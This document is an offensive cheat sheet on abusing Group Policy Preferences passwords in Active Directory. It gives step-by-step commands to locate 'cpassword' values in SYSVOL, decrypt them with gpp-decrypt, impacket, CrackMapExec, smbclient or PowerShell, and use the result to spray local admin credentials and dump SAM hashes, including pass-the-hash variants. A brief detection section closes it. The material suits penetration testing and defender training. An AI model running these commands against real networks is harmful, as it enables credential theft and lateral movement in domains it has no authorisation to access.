# GPP Passwords Abuse

Group Policy Preferences (GPP) allowed administrators to push configuration changes across domain machines, including setting local account passwords. The problem: these passwords were stored in XML files on the SYSVOL share encrypted with AES-256 — but Microsoft published the encryption key publicly in 2012. Any domain user can read SYSVOL, so any domain user can decrypt these passwords.

Patched by MS14-025, but legacy environments and old GPO backups still appear regularly.

---

## Where to Look

GPP passwords hide in XML files on the SYSVOL share under the domain's Policies folder. The most common files to target:

```
\\<domain>\SYSVOL\<domain>\Policies\{GUID}\MACHINE\Preferences\Groups\Groups.xml
\\<domain>\SYSVOL\<domain>\Policies\{GUID}\USER\Preferences\Groups\Groups.xml
```

Other XML files that may contain `cpassword`:

```
Services\Services.xml
ScheduledTasks\ScheduledTasks.xml
Printers\Printers.xml
Drives\Drives.xml
DataSources\DataSources.xml
```

---

## Method 1 — Manual SYSVOL Search

### Map the SYSVOL share and hunt for cpassword

```cmd
# Map the share
net use Z: \\<dc_hostname>\SYSVOL

# Search for Groups.xml files
dir /s Z:\Groups.xml

# Read the file
type Z:\<path>\Groups.xml
```

The `cpassword` field looks like this inside the XML:

```xml
<Properties action="U" newName="" fullName="" description=""
  cpassword="VPe/o9YRyz2VisnpCs/on4vDev0SSP53OJdFlBkDJ+s="
  changeLogon="0" noChange="0" neverExpires="0" acctDisabled="0"
  userName="LocalAdmin" />
```

### Decrypt the cpassword on Kali

```bash
gpp-decrypt <cpassword_value>

# Example
gpp-decrypt VPe/o9YRyz2VisnpCs/on4vDev0SSP53OJdFlBkDJ+s=
```

---

## Method 2 — impacket-Get-GPPPassword

Automates the SYSVOL search and decryption remotely from Kali.

```bash
# Null session (anonymous access — rare but worth trying)
impacket-Get-GPPPassword -no-pass '<domain_controller>'

# With credentials
impacket-Get-GPPPassword '<domain>/<username>:<password>@<domain_controller>'

# Pass-the-Hash
impacket-Get-GPPPassword -hashes ':<NT_hash>' '<domain>/<username>@<domain_controller>'

# Parse a locally downloaded Policy XML file
impacket-Get-GPPPassword -xmlfile '/path/to/Groups.xml' LOCAL
```

---

## Method 3 — CrackMapExec

```bash
# Automated GPP password extraction with credentials
crackmapexec smb <target> -u <username> -p <password> -d <domain> -M gpp_password

# Pass-the-Hash variant
crackmapexec smb <target> -u <username> -H <LM>:<NT> -d <domain> -M gpp_password
```

---

## Method 4 — smbclient (Manual Download)

```bash
# Connect to SYSVOL
smbclient //<dc_ip>/SYSVOL -U "<domain>\<username>"

# Recursively download everything
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *

# Then grep locally for cpassword
grep -ri "cpassword" .
```

---

## Method 5 — PowerShell from Windows

```powershell
# Search SYSVOL recursively for cpassword
Get-ChildItem -Path "\\<domain>\SYSVOL" -Recurse -ErrorAction SilentlyContinue |
  Select-String -Pattern "cpassword" |
  Select-Object Path, LineNumber, Line
```

---

## What to Do With the Password

Once decrypted, the GPP password is typically a local administrator password pushed domain-wide. Test it against:

```bash
# Check if it works on the DC or other hosts
crackmapexec smb <target_range> -u <username> -p '<decrypted_password>' --local-auth

# If it hits, grab SAM hashes
crackmapexec smb <target> -u <username> -p '<decrypted_password>' --local-auth --sam
```

---

## Why This Still Works in 2025

- Legacy GPOs created before MS14-025 are never cleaned up
- Sysadmins copy old GPO backups into new environments
- Third-party tools sometimes recreate vulnerable GPP entries
- Cloud-synced AD environments often carry forward old policies

---

## Detection Notes

- Monitor SYSVOL access for unusual read patterns — especially Groups.xml reads from non-admin workstations
- Event ID 5145 — network share object access on SYSVOL
- Audit `cpassword` strings in any new GPO configurations